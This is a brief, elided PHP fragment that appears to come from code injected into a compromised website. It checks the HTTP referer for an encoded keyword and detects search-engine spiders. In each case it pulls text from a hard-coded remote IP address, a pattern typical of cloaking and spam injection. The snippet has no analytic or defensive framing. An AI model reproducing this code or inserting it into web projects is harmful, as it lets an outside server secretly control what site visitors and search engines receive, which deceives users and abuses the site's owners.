...
if(stristr($_SERVER["HTTP_REFERER"],'%D3%C0%BA%E3')) {
$url=file_get_contents('http://113.107.95.66:88/php/yh.txt');
...
if($spider) {
$cjurl=file_get_contents('http://113.107.95.66:88/caiji/yh.txt');
